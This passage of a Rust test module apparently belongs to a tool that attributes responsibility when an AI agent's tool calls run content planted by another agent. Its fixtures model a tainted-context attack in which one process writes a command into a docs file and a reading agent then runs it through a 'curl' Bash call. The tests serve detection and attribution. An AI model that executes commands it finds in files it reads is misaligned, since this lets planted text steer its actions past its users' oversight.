            graph.observe_message_direct(process, MessageId::from(message));
        }
        RawIdentityInput::from_snapshot(&graph.snapshot(), Vec::new())
    }

    fn identity_input() -> RawIdentityInput {
        identity_input_with(&[])
    }

    fn intent(
        id: &str,
        process: ProcessId,
        message: &str,
        tool: &str,
        native_ref: &str,
        args: Vec<NormalizedArg>,
        ts: u64,
    ) -> Intent {
        Intent {
            intent_id: IntentId::from(id),
            process_id: process,
            message_id: MessageId::from(message),
            tool_name: tool.into(),
            tool_args: args,
            intent_class: IntentClass::SideEffect,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::RequestHistoryAssistantToolUse,
            timestamp_ns: ts,
            native_tool_call: Some(native(native_ref)),
            declared_conversation_id: None,
        }
    }

    fn action(
        id: &str,
        process: ProcessId,
        action_type: ActionCandidateType,
        args: Vec<NormalizedArg>,
        outcome: ActionOutcome,
        ret: i64,
        ts: u64,
    ) -> Action {
        Action {
            outcome,
            syscall_ret: Some(ret),
            syscall_name: Some("write".into()),
            action_id: ActionId::from(id),
            process_id: process,
            action_type,
            normalized_args: args,
            derivation_mode: CandidateDerivationMode::Direct,
            signal_class: SignalClass::HighSignal,
            timestamp_ns: ts,
        }
    }

    fn evidence(id: &str, intent_id: &str, action_id: &str) -> CorrelationEvidence {
        CorrelationEvidence {
            evidence_id: EvidenceId::from(id),
            intent_id: IntentId::from(intent_id),
            action_id: ActionId::from(action_id),
            match_level: MatchLevel::L1Exact,
            confidence: 0.9,
            matched_fields: NormalizedArgs::default(),
            derivation_mode: CandidateDerivationMode::Direct,
            phase: PhaseIndicator::Provisional { timestamp_ns: 1 },
            timestamp_ns: 1,
        }
    }

    fn witness() -> CapturedContextWitness {
        let bash = bash_intent();
        CapturedContextWitness {
            source_message_index: 2,
            source_json_pointer: "/messages/2/content/0".into(),
            source_native_ref: Some(native("toolu_read")),
            target_message_index: 3,
            target_json_pointer: "/messages/3".into(),
            target_native_ref: native("toolu_bash"),
            target_tool_name: "Bash".into(),
            target_args_sha256: normalized_args_sha256(&bash.tool_args),
            matched_line: COMMAND.into(),
            source_text_sha256: "c".repeat(64),
            task_text_overlap: false,
        }
    }

    fn read_intent() -> Intent {
        intent(
            "intent-read",
            reader(),
            "msg-b",
            "Read",
            "toolu_read",
            vec![NormalizedArg::Path(PATH.into())],
            1500,
        )
    }

    fn writer_intent(id: &str, process: ProcessId) -> Intent {
        intent(
            id,
            process,
            "msg-a",
            "Write",
            "toolu_write",
            vec![
                NormalizedArg::Path(PATH.into()),
                NormalizedArg::Content(format!("# docs\n{COMMAND}\n")),
            ],
            800,
        )
    }

    fn bash_intent() -> Intent {
        intent(
            "intent-bash",
            reader(),
            "msg-b",
            "Bash",
            "toolu_bash",
            vec![
                NormalizedArg::Command("curl".into()),
                NormalizedArg::Content(COMMAND.into()),
            ],
            2500,
        )
    }

    fn checkpoint() -> AnalysisCheckpoint {
        AnalysisCheckpoint {
            run_id: "run-1".into(),
            contract: REPLAY_CONTRACT.into(),
            implementation: implementation_fingerprint(),
            graph: GraphSnapshot {
                snapshot_id: "snapshot".into(),
                timestamp_ns: 1,
                nodes: vec![],
                edges: vec![],
                metrics: Default::default(),
            },
            identity_input: Some(identity_input()),
            identity_policy: Some(IdentityBoundaryPolicy::new(["claude"])),
            identities: vec![],
            evidence: vec![
                evidence("ev-read", "intent-read", "action-read"),
                evidence("ev-write", "intent-write", "action-write"),
                evidence("ev-bash", "intent-bash", "action-bash"),
            ],
            intents: vec![
                read_intent(),
                writer_intent("intent-write", writer()),
                bash_intent(),
            ],
            actions: vec![
                action(
                    "action-read",
                    reader(),
                    ActionCandidateType::FileRead,
                    vec![NormalizedArg::Path(PATH.into())],
                    ActionOutcome::Succeeded,
                    10,
                    2000,
                ),
                action(
                    "action-write",
                    writer(),
                    ActionCandidateType::FileWrite,
                    vec![NormalizedArg::Path(PATH.into())],
                    ActionOutcome::Succeeded,
                    10,
                    1000,
                ),
                action(
                    "action-bash",
                    reader(),
                    ActionCandidateType::ProcessExec,
                    vec![NormalizedArg::Command("curl".into())],
                    ActionOutcome::Succeeded,
                    0,
                    3000,
                ),
            ],
            delegations: vec![],
            score_signals: Default::default(),
            observations: vec![],
            disable_patterns: false,
            classification_config: Default::default(),
            workspace_prefix: String::new(),
            fallback_agent_id: None,
            timeline: Default::default(),
            capture_quality: serde_json::Value::Null,
            observer_enabled: None,
            graph_refinements: vec![],
            identity_refinements: vec![],
            evidence_refinements: vec![],
            non_link_count: 0,
            captured_request_contexts: Some(vec![CapturedRequestContext {
                run_id: "run-1".into(),
                process: reader(),
                message_id: MessageId::from("msg-b"),
                observed_at_ns: 5000,
                captured_body_sha256: "a".repeat(64),
                normalized_payload_sha256: "b".repeat(64),
                normalization: "strip_http_headers+dechunk_body".into(),
                source_truncation_count: 0,
                witnesses: vec![witness()],
            }]),
            graph_inputs: None,
        }
    }

    fn claim() -> ResponsibilityClaim {
        ResponsibilityClaim {
            claim_id: ClaimId::from("claim-1"),
            claim_type: ResponsibilityClaimType::TaintedContextUse,
            subject: AgentId::from("agent-b"),
            policy_id: PolicyId::from("policy"),
            boundary_id: BoundaryId::from("boundary"),
            claim_state: ResponsibilityClaimState::Observed,
            severity: AlertSeverity::Warning,
            confidence: 0.5,
            evidence_refs: vec![EvidenceId::from("ev-bash")],
            competing_explanations: vec![],
            traceback_ref: Some(TracebackId::from("tb-1")),
            phase: PhaseIndicator::Provisional { timestamp_ns: 1 },
        }
    }

    fn build(checkpoint: &AnalysisCheckpoint) -> AttributionResult {
        let results = AttributionBuilder::build(checkpoint, &[claim()]);
        assert_eq!(results.schema, ATTRIBUTION_SCHEMA);
        assert_eq!(results.run_id, "run-1");
        results.claims.into_iter().next().expect("one claim")
    }

    fn actor_count(result: &AttributionResult) -> usize {
        result
            .root_groups
            .iter()
            .flat_map(|group| group.actors.iter())
            .count()
    }

    fn is_acyclic(result: &AttributionResult) -> bool {
        let mut adjacency: std::collections::BTreeMap<&str, Vec<&str>> =
            std::collections::BTreeMap::new();
        for edge in &result.edges {
            adjacency
                .entry(edge.source.as_str())
                .or_default()
                .push(edge.target.as_str());
        }
        fn visit<'a>(
            node: &'a str,
            adjacency: &std::collections::BTreeMap<&'a str, Vec<&'a str>>,
            visiting: &mut std::collections::BTreeSet<&'a str>,
            done: &mut std::collections::BTreeSet<&'a str>,
        ) -> bool {
            if done.contains(node) {
                return true;
            }
            if !visiting.insert(node) {
                return false;
            }
            if let Some(next) = adjacency.get(node) {
                for target in next {
                    if !visit(target, adjacency, visiting, done) {
                        return false;
                    }
                }
            }
            visiting.remove(node);
            done.insert(node);
            true
        }
        let mut done = std::collections::BTreeSet::new();
        adjacency
            .keys()
            .copied()
            .collect::<Vec<_>>()
            .into_iter()
            .all(|node| {
                let mut visiting = std::collections::BTreeSet::new();
                visit(node, &adjacency, &mut visiting, &mut done)
            })
    }

    #[test]
    fn writer_source_reader_result_and_executor_are_separated() {
        let result = build(&checkpoint());
        assert_eq!(result.claim_id, "claim-1");
        assert_eq!(result.traceback_ref.as_deref(), Some("tb-1"));
        assert_eq!(actor_count(&result), 1);
        assert_eq!(result.root_groups.len(), 1);
        assert_eq!(result.root_groups[0].actors.len(), 1);
        assert_eq!(result.ranked_agents.as_ref().map(Vec::len), Some(1));
        assert_eq!(result.executors.len(), 1);
        assert_ne!(
            Some(&result.executors[0].actor),
            result
                .ranked_agents
                .as_ref()
                .and_then(|ranked| ranked.first()),
            "executor and root candidate are different fields"
        );
        assert_eq!(result.source_entry_candidates.len(), 1);
        assert_eq!(
            result.unique_entry,
            Some(result.source_entry_candidates[0].node_id.clone())
        );
        assert!(result.edges.iter().any(|edge| {
            edge.edge_type == "writer_source_candidate"
                && edge
                    .note
                    .as_deref()
                    .is_some_and(|note| note.contains("not proven"))
        }));
        assert!(
            result
                .edges
                .iter()
                .any(|edge| edge.edge_type == "intent_action_correlation")
        );
        assert!(is_acyclic(&result), "candidate edges must stay acyclic");
        assert!(
            result
                .limitations
                .iter()
                .any(|limitation| limitation.contains("unobserved file version"))
        );
        assert!(
            result
                .limitations
                .iter()
                .any(|limitation| limitation.contains("not authentication"))
        );
        assert!(result.abstentions.is_empty());
    }

    #[test]
    fn native_history_reobservation_can_support_the_original_call() {
        let mut checkpoint = checkpoint();
        let history = MessageId::from("history-msg");
        let raw = checkpoint.identity_input.as_mut().unwrap();
        raw.direct_process_messages
            .iter_mut()
            .find(|row| row.process_id == reader())
            .unwrap()
            .message_ids
            .push(history.clone());
        checkpoint.captured_request_contexts.as_mut().unwrap()[0].message_id = history;
        let result = build(&checkpoint);
        assert_eq!(
            actor_count(&result),
            1,
            "content dedup must not disconnect captured call references"
        );
    }

    #[test]
    fn text_fallback_cannot_borrow_a_native_source_witness() {
        let mut checkpoint = checkpoint();
        checkpoint.intents[2].authority_source = IntentAuthoritySource::TextFallback;
        let result = build(&checkpoint);
        assert!(result.root_groups.is_empty());
        assert!(result.source_entry_candidates.is_empty());
    }

    #[test]
    fn executor_identity_is_not_borrowed_from_the_intent() {
        let mut checkpoint = checkpoint();
        checkpoint.actions[2].process_id = ProcessId::new(999, 99);
        let result = build(&checkpoint);
        assert!(
            result.executors.is_empty(),
            "an unknown OS actor must remain unknown"
        );
    }

    #[test]
    fn source_truncation_does_not_create_a_unique_rank() {
        let mut checkpoint = checkpoint();
        checkpoint.captured_request_contexts.as_mut().unwrap()[0].source_truncation_count = 1;
        let result = build(&checkpoint);
        assert!(
            result.ranked_agents.is_none(),
            "missing alternatives cannot establish a unique root"
        );
        assert!(result.unique_entry.is_none());
    }

    #[test]
    fn historical_capture_does_not_assert_observed_time_order() {
        let mut checkpoint = checkpoint();
        checkpoint.intents[2].timestamp_ns = 9000;
        let result = build(&checkpoint);
        assert!(
            result
                .edges
                .iter()
                .filter(|edge| edge.edge_type == "intent_action_correlation")
                .filter(|edge| edge.source == "intent:intent-bash")
                .all(|edge| !edge.observed_not_after)
        );
        assert!(
            result
                .edges
                .iter()
                .filter(|edge| edge.edge_type == "request_history_text_reuse")
                .all(|edge| !edge.observed_not_after)
        );
    }

    #[test]
    fn bounded_attribution_has_no_dangling_edges() {
        let mut checkpoint = checkpoint();
        let context = &mut checkpoint.captured_request_contexts.as_mut().unwrap()[0];
        let original = context.witnesses[0].clone();
        context.witnesses = (0..80)
            .map(|i| {
                let mut witness = original.clone();
                witness.source_message_index = i;
                witness.target_message_index = 100;
                witness.source_json_pointer = format!("/messages/{i}/content/0");
                witness
            })
            .collect();
        let result = build(&checkpoint);
        assert!(result.truncated);
        let nodes: BTreeSet<_> = result
            .occurrences
            .iter()
            .map(|node| node.node_id.as_str())
            .collect();
        assert!(result.edges.iter().all(
            |edge| nodes.contains(edge.source.as_str()) && nodes.contains(edge.target.as_str())
        ));
    }

    #[test]
    fn no_writer_leaves_root_unknown_but_keeps_the_executor() {
        let mut checkpoint = checkpoint();
        checkpoint
            .intents
            .retain(|intent| intent.tool_name != "Write");
        checkpoint
            .evidence
            .retain(|evidence| evidence.evidence_id.as_str() != "ev-write");
        checkpoint
            .actions
            .retain(|action| action.action_id.as_str() != "action-write");
        let result = build(&checkpoint);
        assert!(result.root_groups.is_empty());
        assert_eq!(result.ranked_agents, None);
        assert_eq!(result.executors.len(), 1);
        assert!(
            result
                .abstentions
                .iter()
                .any(|abstention| abstention.code == "root_unknown")
        );
        assert_eq!(result.source_entry_candidates.len(), 1);
    }

    #[test]
    fn two_supported_writers_tie_in_one_group_without_a_linear_rank() {
        let mut checkpoint = checkpoint();
        let other = ProcessId::new(300, 3);
        checkpoint.identity_input = Some(identity_input_with(&[(other, "msg-c")]));
        let mut other_writer = writer_intent("intent-write-c", other);
        other_writer.message_id = MessageId::from("msg-c");
        checkpoint.intents.push(other_writer);
        checkpoint.actions.push(action(
            "action-write-c",
            other,
            ActionCandidateType::FileOverwrite,
            vec![NormalizedArg::Path(PATH.into())],
            ActionOutcome::Succeeded,
            12,
            900,
        ));
        checkpoint
            .evidence
            .push(evidence("ev-write-c", "intent-write-c", "action-write-c"));
        let result = build(&checkpoint);
        assert_eq!(result.root_groups.len(), 1);
        assert_eq!(result.root_groups[0].actors.len(), 2);
        assert_eq!(result.ranked_agents, None);
        assert!(result.root_groups[0].writers.len() >= 2);
    }

    #[test]
    fn failed_zero_byte_and_later_writes_cannot_become_the_root() {
        for (outcome, ret, ts) in [
            (ActionOutcome::Failed, 10, 1000),
            (ActionOutcome::Succeeded, 0, 1000),
            (ActionOutcome::Succeeded, 10, 2500),
        ] {
            let mut checkpoint = checkpoint();
            checkpoint.actions[1] = action(
                "action-write",
                writer(),
                ActionCandidateType::FileWrite,
                vec![NormalizedArg::Path(PATH.into())],
                outcome,
                ret,
                ts,
            );
            let result = build(&checkpoint);
            assert!(result.root_groups.is_empty(), "case {outcome:?}/{ret}/{ts}");
            assert_eq!(result.ranked_agents, None, "case {outcome:?}/{ret}/{ts}");
        }
    }

    #[test]
    fn shared_pid_ambiguous_action_identity_is_not_borrowed() {
        let mut checkpoint = checkpoint();
        checkpoint.actions[1].process_id = ProcessId::new(999, 9);
        checkpoint.intents[1].process_id = ProcessId::new(999, 9);
        let result = build(&checkpoint);
        assert!(result.root_groups.is_empty());
        assert_eq!(result.ranked_agents, None);
        assert!(result.abstentions.iter().any(|abstention| {
            abstention.code == "writer_identity_unavailable" || abstention.code == "root_unknown"
        }));
    }

    #[test]
    fn different_run_native_format_args_and_future_sources_do_not_join() {
        let mut wrong_run = checkpoint();
        if let Some(contexts) = wrong_run.captured_request_contexts.as_mut() {
            contexts[0].run_id = "other-run".into();
        }
        assert!(build(&wrong_run).source_entry_candidates.is_empty());

        let mut wrong_format = checkpoint();
        if let Some(contexts) = wrong_format.captured_request_contexts.as_mut() {
            contexts[0].witnesses[0].target_native_ref.format = NativeToolCallFormat::OpenAi;
        }
        assert!(build(&wrong_format).source_entry_candidates.is_empty());

        let mut wrong_args = checkpoint();
        if let Some(contexts) = wrong_args.captured_request_contexts.as_mut() {
            contexts[0].witnesses[0].target_args_sha256 = "0".repeat(64);
        }
        assert!(build(&wrong_args).source_entry_candidates.is_empty());

        let mut future = checkpoint();
        if let Some(contexts) = future.captured_request_contexts.as_mut() {
            contexts[0].witnesses[0].source_message_index = 4;
        }
        assert!(build(&future).source_entry_candidates.is_empty());
    }

    #[test]
    fn parallel_source_alternatives_are_preserved_without_a_unique_entry() {
        let mut checkpoint = checkpoint();
        let mut second = witness();
        second.source_json_pointer = "/messages/2/content/1".into();
        second.source_text_sha256 = "e".repeat(64);
        if let Some(contexts) = checkpoint.captured_request_contexts.as_mut() {
            contexts[0].witnesses.push(second);
        }
        let result = build(&checkpoint);
        assert_eq!(result.source_entry_candidates.len(), 2);
        assert_eq!(result.unique_entry, None);
        assert!(is_acyclic(&result));
    }

    #[test]
    fn legacy_missing_context_or_identity_input_abstains_explicitly() {
        let mut legacy = checkpoint();
        legacy.captured_request_contexts = None;
        let result = build(&legacy);
        assert!(
            result
                .abstentions
                .iter()
                .any(|abstention| { abstention.code == "captured_context_unavailable" })
        );

        let mut no_identity = checkpoint();
        no_identity.identity_input = None;
        let result = build(&no_identity);
        assert!(
            result
                .abstentions
                .iter()
                .any(|abstention| { abstention.code == "identity_unavailable" })
        );
        assert_eq!(result.ranked_agents, None);
        assert!(result.executors.is_empty());
    }

    #[test]
    fn dangling_citation_is_reported_not_replaced_by_invented_evidence() {
        let mut checkpoint = checkpoint();
        checkpoint.evidence.clear();
        let result = build(&checkpoint);
        assert!(result.abstentions.iter().any(|abstention| {
            abstention.code == "dangling_evidence" || abstention.code == "citation_unavailable"
        }));
        assert!(result.occurrences.is_empty());
        assert!(result.edges.is_empty());
    }

    #[tokio::test]
    async fn checkpoint_evaluate_matches_replay_executor_attributions() {
        use crate::responsibility::graph::{ResponsibilityGraph, create_snapshot};
        use crate::responsibility::persistence::{
            PersistRecord, PersistenceReader, PersistenceWriter, WriterConfig,
        };
        use crate::responsibility::replay::ReplayExecutor;
        use crate::responsibility::replay::checkpoint::{CHECKPOINT_KIND, CHECKPOINT_VERSION};

        let mut checkpoint = checkpoint();
        let mut graph = ResponsibilityGraph::with_default_config();
        graph.add_node(ResponsibilityNode {
            node_id: NodeId::from("node-agent"),
            node_type: ResponsibilityNodeType::Agent,
            agent_id: Some(AgentId::from("agent-b")),
            resource: None,
            evidence_refs: Vec::new(),
            timestamp_ns: 1,
            phase: PhaseIndicator::Provisional { timestamp_ns: 1 },
        });
        graph.add_node(ResponsibilityNode {
            node_id: NodeId::from("node-boundary"),
            node_type: ResponsibilityNodeType::PolicyBoundary,
            agent_id: None,
            resource: Some(NormalizedResource::File {
                canonical_path: PATH.into(),
            }),
            evidence_refs: Vec::new(),
            timestamp_ns: 1,
            phase: PhaseIndicator::Provisional { timestamp_ns: 1 },
        });
        graph.add_edge(ResponsibilityEdge {
            edge_id: EdgeId::from("edge-pbc"),
            edge_type: ResponsibilityEdgeType::PolicyBoundaryCrossing,
            operation: None,
            source: NodeId::from("node-agent"),
            target: NodeId::from("node-boundary"),
            evidence_refs: vec![EvidenceId::from("ev-bash")],
            confidence: 0.9,
            phase: PhaseIndicator::Provisional { timestamp_ns: 1 },
        });
        checkpoint.graph = create_snapshot(&graph, "fixture-graph".into(), 1);
        checkpoint.validate("run-1").unwrap();

        let live = checkpoint.evaluate();
        assert!(
            !live.claims.is_empty(),
            "fixture graph must mint at least one claim"
        );
        assert!(
            live.attributions
                .claims
                .iter()
                .any(|result| !result.root_groups.is_empty()),
            "fixture must support at least one root candidate: {:?}",
            live.attributions
        );

        let dir = tempfile::tempdir().unwrap();
        let path = dir
            .path()
            .join("attribution.db")
            .to_string_lossy()
            .into_owned();
        let writer = PersistenceWriter::new(WriterConfig {
            db_path: path.clone(),
            ..Default::default()
        })
        .unwrap();
        writer
            .write_blocking(PersistRecord::RunStart {
                run_id: "run-1".into(),
                timestamp_ns: 1,
            })
            .await;
        writer
            .write_blocking(PersistRecord::AnalysisCheckpoint {
                run_id: "run-1".into(),
                kind: CHECKPOINT_KIND.into(),
                version: CHECKPOINT_VERSION,
                payload: serde_json::to_value(&checkpoint).unwrap(),
            })
            .await;
        writer.flush().await.unwrap();
        assert_eq!(writer.write_failure_count(), 0);

        let reader = PersistenceReader::open(&path).unwrap();
        let replayed = ReplayExecutor::reauthoritative(&reader, "run-1").unwrap();
        assert!(
            !replayed.claims.is_empty(),
            "replay must mint the same claim class"
        );
        assert!(
            replayed
                .attributions
                .claims
                .iter()
                .any(|result| !result.root_groups.is_empty()),
            "replay must preserve a supported root candidate: {:?}",
            replayed.attributions
        );
        // Exported references must resolve to the same frozen evidence revision.
        assert_eq!(replayed.attributions, live.attributions);
    }
}
